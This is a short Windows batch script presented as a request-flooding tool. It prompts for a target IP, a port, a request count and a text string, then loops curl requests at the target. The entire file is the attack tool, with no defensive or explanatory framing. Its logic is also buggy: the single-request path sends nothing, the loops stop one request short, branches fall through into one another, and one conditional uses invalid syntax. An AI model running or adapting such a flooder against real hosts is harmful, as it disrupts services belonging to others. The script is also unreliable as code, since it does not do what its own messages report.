:main
@echo on && color c && cls && REM code by whiteavocado and reveloperboy.
set /p "var1=enter target ip:"
set /p "var2=enter target port (80/443):"
set /p "var3=how many requests:"
set /p "var4=request text (no spaces! Use _ instead!):"
if %var3% == 1 goto var3_one else goto var3_more

:var3_one
if %var2% == 80 goto var3_one_80
if %var2% == 443 goto var3_one_443
echo wrong port selected!
set /p "end=click enter to go back."
goto main

:var3_one_80
echo sending one request to http://%var1%/?%var4%
pause
:starta
set /a loop1+=1
if %loop1% EQU 1 goto enda
curl http://%var1%/%var4%
goto starta

:enda
echo send one request to http://%var1%:%var2% with text:"%var4%".
pause

:var3_one_443
echo sending one request to https://%var1%/?%var4%
pause
:startab
set /a loop1+=1
if %loop1% EQU 1 goto endab
curl https://%var1%/%var4%
goto startab

:endab
echo send one request to https://%var1%:%var2% with text:"%var4%".
pause

:var3_more
if %var2% == 80 goto var3_more_80
if %var2% == 443 goto var3_more_443
echo wrong port selected!
set /p "end=click enter to go back."
goto main

:var3_more_80
echo sending %var3% requests to http://%var1%/?%var4%
pause
:startaa
set /a loop2+=1
if %loop2% EQU %var3% goto endaa
curl http://%var1%/%var4%
goto startaa

:endaa
echo send %var3% requests to http://%var1%:%var2% with text:"%var4%".
pause

:var3_more_443
echo sending %var3% requests to https://%var1%/?%var4%
pause
:startaac
set /a loop3+=1
if %loop3% EQU %var3% goto endaac
curl https://%var1%/%var4%
goto startaac

:endaac
echo send %var3% requests to https://%var1%:%var2% with text:"%var4%".
pause